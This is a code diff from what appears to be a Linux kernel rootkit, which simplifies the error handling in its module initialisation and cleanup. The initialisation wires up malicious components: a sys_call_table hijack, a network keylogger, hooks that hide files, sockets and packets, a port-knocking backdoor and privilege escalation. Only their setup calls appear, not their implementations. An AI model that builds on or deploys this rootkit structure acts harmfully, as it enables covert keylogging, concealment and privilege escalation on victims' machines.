@@ -11,79 +11,61 @@
 
 int init_module(void) {
 
-	int res;
-
 	debug("Rootkit module initializing...\n");
 
     /* start udp server */
-    res = udp_server_start();
+    if(udp_server_start()) {
 
-    if(res) {
-
-    	alert("Error on udp_server_start (returned %d)\n", res);
+    	alert("Error on udp_server_start\n");
     	return -EINVAL;
     }
 
 	/* set sys call table pointer */
-	res = set_sys_call_table();
+    if(set_sys_call_table()) {
 
-    if(res) {
-
-    	alert("Error on set_sys_call_table (returned %d)\n", res);
+    	alert("Error on set_sys_call_table\n");
     	return -EINVAL;
     }
 
 	/* init keylogger */
-	res = network_keylogger_init();
+    if(network_keylogger_init()) {
 
-    if(res) {
-
-    	alert("Error on network_keylogger_init (returned %d)\n", res);
+    	alert("Error on network_keylogger_init\n");
     	return -EINVAL;
     }
 
 	/* hook getdents */
-	res = hook_getdents_init();
+    if(hook_getdents_init()) {
 
-    if(res) {
-
-    	alert("Error on hook_getdents_init (returned %d)\n", res);
+    	alert("Error on hook_getdents_init\n");
     	return -EINVAL;
     }
 
 	/* hook recvmsg */
-	res = socket_hiding_init();
+    if(socket_hiding_init()) {
 
-    if(res) {
-
-    	alert("Error on socket_hiding_init (returned %d)\n", res);
+    	alert("Error on socket_hiding_init\n");
     	return -EINVAL;
     }
 
 	/* hook packets */
-	res = packet_hiding_init();
+    if(packet_hiding_init()) {
 
-    if(res) {
-
-    	alert("Error on packet_hiding_init (returned %d)\n", res);
+    	alert("Error on packet_hiding_init\n");
     	return -EINVAL;
     }
 
 	/* port knocking */
-	res = port_knocking_init();
+    if(port_knocking_init()) {
 
-    if(res) {
-
-    	alert("Error on port_knocking_init (returned %d)\n", res);
+    	alert("Error on port_knocking_init\n");
     	return -EINVAL;
     }
 
 	/* privilege escalation */
-	res = priv_escalation_init();
+    if(priv_escalation_init()) {
 
-    if(res) {
-
-    	alert("Error on priv_escalation_init (returned %d)\n", res);
+    	alert("Error on priv_escalation_init\n");
     	return -EINVAL;
     }
 
@@ -133,10 +115,7 @@ void reset_module(void) {
 void cleanup_module(void) {
 
     debug("Unloading rootkit module...");
-
-	/* reset and free everything */
 	reset_module();
-
     debug("Rootkit module unloaded.\n");
 }
 
